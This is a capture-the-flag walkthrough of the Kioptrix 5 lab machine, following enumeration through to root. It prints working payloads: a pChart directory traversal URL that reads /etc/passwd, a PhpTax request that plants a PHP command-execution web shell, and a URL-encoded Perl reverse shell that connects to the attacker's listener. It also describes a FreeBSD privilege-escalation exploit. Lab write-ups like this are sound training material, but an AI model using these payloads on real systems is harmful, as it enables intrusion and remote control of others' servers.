# Kioptrix 5 Walkthrough

We first did some enumeration to identify our vulnerable machine. Using `arp-scan -l` we found our vulnerable machine to be `172.168.48.136`.

We then performed a basic nmap scan to get to know ports that are open and any other basic information that would be of help.

![Enumeration Results](/post-images/Kioptrix%205/01%20Enum.png)

Our nmap results were the following, with port 22 (ssh) closed, 80 open we would access a web version supported by apache. So we opened our machines IP in our web browser.

The browser pulled up with a message that it work, we did a directory bust with dirb but nothing cropped. So we assumed that there were no any other files for the site. Since this site was listening from port 80 we decided to listen out on what was from port 8080, and below were our findings.

![Enumeration Results](/post-images/Kioptrix%205/03%20Forbbiden.png)

With this we thought that the site was unreachable, but when we view the source code of the site we came to the realization that the error was hardcoded to the site so it wasn't genuine error code.

![Enumeration Results](/post-images/Kioptrix%205/04%20smoke%20and%20mirrors.png)

This prompted us to check out the site from port 80 and viewed it's source code and we found a url redirection to a point in the site with `/pChart2.1.3/examples/index.php`. So we decided to visit the site.

![Enumeration Results](/post-images/Kioptrix%205/05%20back%20log.png)

We only found charts, there was nothing much of importance after looking around for a while, found some code in the imaging map and found that the code is that, that is used to create the charts so that was a dead end too.

![Enumeration Results](/post-images/Kioptrix%205/06%20back%20server.png)

![Enumeration Results](/post-images/Kioptrix%205/07%20search.png)

So we decided to look for important files in the backend of the machine's site, so we prompted it with the command:


So we check the usr(User System Resources which contains user files and manually installed files) luckily we found a local folder and the etc folder and the apache22 folder which contained the configuration files.

We read across the document and couldn't find ways to make changes to the configuration file remotely.

```
{http://172.168.48.136/pChart2.1.3/examples/index.php?Action=View&Script=/../../etc/passwd }

 ```

![Enumeration Results](/post-images/Kioptrix%205/09con.png)

So we read the contents at the bottom indicated that the site was only compatible with mozilla/4.0, and our browser was 5.0 so it meant there were files we couldn't access (restricted content).

![Enumeration Results](/post-images/Kioptrix%205/10%20mozilla%20v.png)

So we decided to look for a work around and found out that we could use to change the user agent of the browser [here](https://www.howtogeek.com/113439/how-to-change-your-browsers-user-agent-without-installing-any-extensions/). We followed the instructions and boom there it was switched from 5.0 to 4.0.

![Enumeration Results](/post-images/Kioptrix%205/11%20about.png)

![Enumeration Results](/post-images/Kioptrix%205/12%20general.useragent.override.png)

![Enumeration Results](/post-images/Kioptrix%205/13%20mozilla%20v.png)

![Enumeration Results](/post-images/Kioptrix%205/14%20change.pref.png)

After refreshing the page with the new configurations, the page `http://172.168.48.136:8080/` we were presented with an index with a phptax.php file.

![Enumeration Results](/post-images/Kioptrix%205/15%20index.php.png)

We opened the phptax redirect and it opened a website with a tax file from a William.

![Enumeration Results](/post-images/Kioptrix%205/16%20php_tax.png)

So we wrote a php script to inject a rce code that will inject a rce.php in the /data folder.

```
{http://172.168.48.136:8080/phptax/index.php?field=rce.php&newvalue=<%3Fphp passthru(%24_GET[cmd])%3B%3F>}

```

- field=rce.php - Specifies the file name to be created or manipulated. In this case, the file rce.php will be created in the ./data/ directory
- newvalue=%3C%3Fphp%20passthru(%24_GET%5Bcmd%5D)%3B%3F%3E - This is the URL-encoded PHP code that will be written to the file rce.php.
- <?php passthru($_GET['cmd']); ?> - PHP function that executes a system command and outputs the result, Retrieves the value of the cmd parameter from the URL.

With the command execution successfully exploiting the Remote Code Execution (RCE) vulnerability in the PhpTax application we added a script to prompt a cmd parameter in the rce to provide the value of the id of the system with this code:

```
{http://172.168.48.136:8080/phptax/data/rce.php?cmd=id}

```

- /phptax/data/rce.php? - This is the path to the malicious file (rce.php) created in the ./data/ directory of the PhpTax application and file rce.php contains PHP code that allows command execution.

![Enumeration Results](/post-images/Kioptrix%205/17%20phptax_payload.png)

![Enumeration Results](/post-images/Kioptrix%205/18%20return_cmd.png)

```
{http://172.168.48.136:8080/phptax/data/rce.php?cmd=perl -e 'use Socket%3B%24i%3D"172.168.48.134"%3B%24p%3D4444%3Bsocket(S%2CPF_INET%2CSOCK_STREAM%2Cgetprotobyname("tcp"))%3bif(connect(S%2csockaddr_in(%24p%2cinet_aton(%24i))))%7bopen(STDIN%2c%22%3E%26S%22)%3bopen(STDOUT%2c%22%3E%26S%22)%3bopen(STDERR%2c%22%3E%26S%22)%3bexec(%22%2fbin%2fsh%20-i%22)%3b%7d%3b%27}

```
Then open a perl reverse shell that opens the cmd=id prompt with the reverse shell.

This opened with a netcat on my terminal pulls a bash shell in the netcat listener.

![Enumeration Results](/post-images/Kioptrix%205/20%20nc%20listener.png)

![Enumeration Results](/post-images/Kioptrix%205/19whoami.png)

Since we know that the kioptrix machine is running on FreeBSD we look for a privilege escalation on FreeBSD and we find 2. One has issues in the compilation and so we used the second exploit. We tried opening a simple http server using python and ran it, tried using wget but it didn't function, we could also use fetch which also like wget, so we decided to use netcat which we opened a listener in our Kali terminal and another in our target machine which accepts the file from our listener in the Kali terminal. The exploit gets copied to our target machine.

![Enumeration Results](/post-images/Kioptrix%205/22%20netcat.png)

We then compiled the exploit and put the output to root.

![Enumeration Results](/post-images/Kioptrix%205/23%20compile.png)

We then ran the exploit and we get root.

![Enumeration Results](/post-images/Kioptrix%205/24%20who%20ami.png)

We navigated for any interesting thing since the box is described as a CTF box where the idea in CTFs is to find flags which are used as PoC. According to most CTFs flags in AD games are in var, etc and root folders. So navigating to root folder we get the congrats.txt, we cat and we get this message.

![Enumeration Results](/post-images/Kioptrix%205/25%20congrats.txt.png)

<mark>The box is completed.</mark>